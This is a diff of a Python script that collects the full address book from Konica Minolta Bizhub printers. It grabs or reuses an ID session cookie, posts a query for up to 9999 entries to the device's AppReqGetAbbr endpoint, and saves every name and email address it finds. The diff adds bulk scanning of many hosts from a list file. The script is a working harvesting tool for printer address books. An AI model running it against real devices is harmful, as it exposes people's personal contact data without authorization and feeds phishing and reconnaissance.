@@ -2,124 +2,129 @@
 import argparse
 import requests
 import sys
-import warnings
 import json
+import os
 
-# Suppress the "InsecureRequestWarning" because we're using verify=False
+# Suppress the "InsecureRequestWarning" about verify=False
+import warnings
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 warnings.simplefilter("ignore", InsecureRequestWarning)
 
+
 def parse_args():
     parser = argparse.ArgumentParser(
-        description="Fetch Konica Bizhub Address Book by auto-getting the session cookie or using a provided one."
+        description="Minimal Bizhub address book fetch: auto-get or use a known cookie, then POST JSON for all entries."
+    )
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument("--ip", help="Single IP or hostname.")
+    group.add_argument("--list", help="File containing a list of IPs/hosts (one per line).")
+
+    parser.add_argument(
+        "-c", "--cookie",
+        default=None,
+        help="If you already have a valid 'ID=...' cookie, supply it here. Otherwise script auto-fetches."
     )
     parser.add_argument(
-        "--ip", 
-        required=True, 
-        help="Hostname or IP of the Konica Bizhub (e.g. 10.20.30.65)."
-    )
-    parser.add_argument(
-        "-c", "--cookie", 
-        default=None, 
-        help="Optional: If you already have a valid 'ID=...' cookie, supply it here."
-    )
-    parser.add_argument(
-        "-n", "--names", 
-        action="store_true", 
-        help="If set, also dump the full names to a file."
+        "-n", "--names",
+        action="store_true",
+        help="If set, also dump the list of user names (in addition to emails)."
     )
     return parser.parse_args()
 
-def auto_get_cookie(ip):
+
+def auto_get_cookie(host):
     """
-    Step 1: Perform a GET to https://<ip>/wcd/index.html
-    to retrieve (or refresh) a session cookie.
-    Returns the full cookie jar and/or the 'ID=' value if present.
+    Perform a GET to https://<host>/wcd/index.html to retrieve the device's 'ID' cookie if it auto-assigns one.
+    Return a requests.Session if successful, or None on failure.
     """
-    url = f"https://{ip}/wcd/index.html"
-    print(f"[*] Attempting to auto-fetch cookie from {url}")
+    url = f"https://{host}/wcd/index.html"
     session = requests.Session()
     try:
-        resp = session.get(url, verify=False, timeout=10)
-        resp.raise_for_status()
-        # At this point, session.cookies should contain whatever
-        # 'Set-Cookie' the device returned. Typically something with "ID=..."
+        r = session.get(url, verify=False, timeout=10)
+        r.raise_for_status()
+        # Check if we got 'ID' in the cookie jar
         if "ID" in session.cookies:
-            # The requests CookieJar will have stored ID=xyz
-            print(f"    Got ID cookie from device: {session.cookies.get('ID')}")
+            # Good: we presumably have a valid session cookie
+            return session
         else:
-            print("[!] The device did not return an 'ID' cookie. We may be unauthorized.")
-        return session
+            # The device didn't set an ID cookie
+            print(f"[!] No 'ID' cookie returned from {url}.")
+            return None
     except requests.exceptions.RequestException as e:
-        print(f"[!] Error fetching cookie: {e}")
+        print(f"[!] Error auto-fetching cookie from {host}: {e}")
         return None
 
-def fetch_address_book(ip, session=None, raw_cookie=None):
-    """
-    Step 2: Post to /wcd/api/AppReqGetAbbr with the JSON body,
-    using either:
-      - a requests.Session that already has an ID cookie, or
-      - a raw 'Cookie: ID=...' header if provided in raw_cookie.
 
-    Returns the parsed JSON (dict) or None on failure.
+def fetch_address_book(host, cookie_value=None, session=None):
     """
-    url = f"https://{ip}/wcd/api/AppReqGetAbbr"
+    POST to /wcd/api/AppReqGetAbbr with minimal data:
+      - Only the ID=... cookie if we have it
+      - The JSON body from Start=1 to End=9999
+    Return the parsed JSON dict, or None on failure.
+    """
 
-    # The device wants a JSON string in the request body,
-    # but also might want "application/x-www-form-urlencoded" as Content-Type.
-    # We'll replicate that from your successful curl command, but
-    # simply post the raw JSON string as data.
-    #
-    # If your device only returns 50 records at a time, you might need
-    # multiple requests with different Start/End, or just pick a large End like 9999.
+    url = f"https://{host}/wcd/api/AppReqGetAbbr"
+
+    # This JSON asks for up to 9999 entries, hoping to get everything in one shot.
     payload = (
         '{"AbbrListCondition":{"WellUse":"false","SearchKey":"None",'
         '"ObtainCondition":{"Type":"IndexList","IndexRange":{"Start":1,"End":9999}},'
         '"SortInfo":{"Condition":"No","Order":"Ascending"},"AddressKind":"Public","SearchSendMode":"0"}}'
     )
 
-    headers = {
-        "User-Agent":       "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
-        "Accept":           "application/json, text/javascript, */*; q=0.01",
-        "Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
-        "X-Requested-With": "XMLHttpRequest",
-        "Origin":           f"https://{ip}",
-        "Referer":          f"https://{ip}/wcd/spa_main.html",
-        # If we have a raw cookie string, set it. Otherwise, rely on session.
-    }
-    if raw_cookie:
-        headers["Cookie"] = raw_cookie
-
+    # We'll store cookies in a dict if we have a cookie_value. 
+    # If a session is provided, we'll rely on session.post(...) so it uses session.cookies.
+    # We do NOT set additional headers since you stated it's not needed.
+    
     try:
         if session:
-            # Use the existing Session (which has the ID cookie in session.cookies)
-            r = session.post(url, headers=headers, data=payload, verify=False, timeout=15)
+            # Use session cookies
+            resp = session.post(url, data=payload, verify=False, timeout=15)
         else:
-            # No session, so rely on the raw_cookie approach
-            r = requests.post(url, headers=headers, data=payload, verify=False, timeout=15)
-        print(f"[*] POST returned status {r.status_code}")
-        if r.status_code == 200:
-            return r.json()  # might raise JSONDecodeError if not valid JSON
+            # Use raw cookie in a dictionary
+            # e.g. {"ID": "somevalue"}
+            cookie_dict = {}
+            if cookie_value:
+                # We expect the user to have passed something like "ID=abc123..."
+                # If it's exactly that, let's parse out the part after "ID=" if needed.
+                # But if user just gave "abc123..." or "ID=abc123..." 
+                # We'll do a small check:
+                if cookie_value.startswith("ID="):
+                    cookie_value = cookie_value[3:]
+                cookie_value = cookie_value.strip()
+                cookie_dict["ID"] = cookie_value
+            
+            resp = requests.post(url, data=payload, cookies=cookie_dict, verify=False, timeout=15)
+
+        if resp.status_code == 200:
+            # Attempt to parse
+            try:
+                return resp.json()
+            except json.JSONDecodeError:
+                print(f"[!] Received HTTP 200 but invalid JSON from {host}.")
+                print("    Partial response:", resp.text[:500])
+                return None
         else:
-            print("[!] Non-200 response. Possibly unauthorized or invalid cookie.")
-            print("    Response text (first 500 chars):", r.text[:500])
+            print(f"[!] Non-200 status from {host}: {resp.status_code}")
+            print("    Partial response:", resp.text[:500])
             return None
-    except (requests.exceptions.RequestException, json.JSONDecodeError) as e:
-        print(f"[!] Error during address book fetch: {e}")
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Error while fetching address book from {host}: {e}")
         return None
+
 
 def extract_names_and_emails(data):
     """
-    Pull out the "Name" and the Email "To" from the JSON data.
-    Adapt if your device’s JSON keys differ.
+    Extract Name and Email addresses from the JSON structure.
+    Return (names_list, emails_list).
     """
-    names = []
-    emails = []
+    names, emails = [], []
 
     if not data:
         return names, emails
 
-    # Common key path: data["AbbrList"]["Abbr"] -> list
+    # Typically the data is in data["AbbrList"]["Abbr"]
+    abbr_list = None
     try:
         abbr_list = data["AbbrList"]["Abbr"]
     except (KeyError, TypeError):
@@ -140,57 +145,79 @@ def extract_names_and_emails(data):
 
     return names, emails
 
-def main():
-    args = parse_args()
-    ip = args.ip
 
-    # 1) If user gave us a cookie with --cookie, we'll skip the auto fetch.
-    #    Otherwise, we attempt the GET /wcd/index.html to get "ID=..."
+def process_host(host, cookie=None, dump_names=False):
+    """
+    Handle the retrieval + parsing for a single host.
+    """
+    print(f"\n[*] Processing host: {host}")
+    # If user didn't supply --cookie, try auto-get
     session = None
-    raw_cookie = None
+    cookie_value = None
 
-    if args.cookie:
-        print("[*] Using user-supplied cookie string.")
-        raw_cookie = args.cookie
+    if cookie:
+        # Use the user-supplied cookie
+        cookie_value = cookie
     else:
-        session = auto_get_cookie(ip)
+        # Attempt auto-fetch
+        session = auto_get_cookie(host)
         if not session:
-            print("[!] Could not auto-fetch a session cookie. Exiting.")
-            sys.exit(1)
+            print(f"[!] Could not retrieve an ID cookie automatically from {host}. Skipping.")
+            return
 
-    # 2) Fetch the address book
-    data = fetch_address_book(ip, session=session, raw_cookie=raw_cookie)
+    data = fetch_address_book(host, cookie_value=cookie_value, session=session)
     if not data:
-        print("[!] No data returned. Possibly invalid cookie or no permission.")
-        sys.exit(1)
+        print(f"[!] No data returned for {host}.")
+        return
 
-    # 3) Extract the relevant info
     names, emails = extract_names_and_emails(data)
     unique_names = sorted(set(names))
     unique_emails = sorted(set(emails))
+    total_records = len(unique_emails)
 
-    print(f"[+] Found {len(unique_names)} unique names.")
-    print(f"[+] Found {len(unique_emails)} unique email addresses.")
+    if not unique_emails and not unique_names:
+        print(f"    [!] Found no email addresses and no names.")
+        return
 
-    # If there's nothing, exit
-    if not unique_names and not unique_emails:
-        print("[!] No entries found or device returned an empty list.")
-        sys.exit(0)
+    print(f"    Found {len(unique_names)} unique names.")
+    print(f"    Found {len(unique_emails)} unique email addresses.")
 
-    # Otherwise write out the email addresses
-    email_filename = f"bizhub-addrBk_emailAddr_{ip}.txt"
-    with open(email_filename, "w", encoding="utf-8") as f:
-        for e in unique_emails:
-            f.write(e + "\n")
-    print(f"[+] Email addresses written to: {email_filename}")
+    # If we found emails, write them
+    if unique_emails:
+        email_filename = f"bizhub-addrBk_emailAddr_{host}.txt"
+        with open(email_filename, "w", encoding="utf-8") as f:
+            for em in unique_emails:
+                f.write(em + "\n")
+        print(f"    -> Emails saved to: {email_filename}")
 
-    # Optionally write out the names
-    if args.names:
-        names_filename = f"bizhub-addrBk_names_{ip}.txt"
+    # If user wants names and there are any
+    if dump_names and unique_names:
+        names_filename = f"bizhub-addrBk_names_{host}.txt"
         with open(names_filename, "w", encoding="utf-8") as f:
-            for n in unique_names:
-                f.write(n + "\n")
-        print(f"[+] Names written to: {names_filename}")
+            for nm in unique_names:
+                f.write(nm + "\n")
+        print(f"    -> Names saved to: {names_filename}")
+
+
+def main():
+    args = parse_args()
+
+    # Single IP
+    if args.ip:
+        process_host(args.ip, cookie=args.cookie, dump_names=args.names)
+    
+    # Multiple IPs in a file
+    elif args.list:
+        if not os.path.isfile(args.list):
+            print(f"[!] The file {args.list} does not exist.")
+            sys.exit(1)
+        with open(args.list, "r", encoding="utf-8") as f:
+            for line in f:
+                host = line.strip()
+                if not host:
+                    continue
+                process_host(host, cookie=args.cookie, dump_names=args.names)
+
 
 if __name__ == "__main__":
     main()
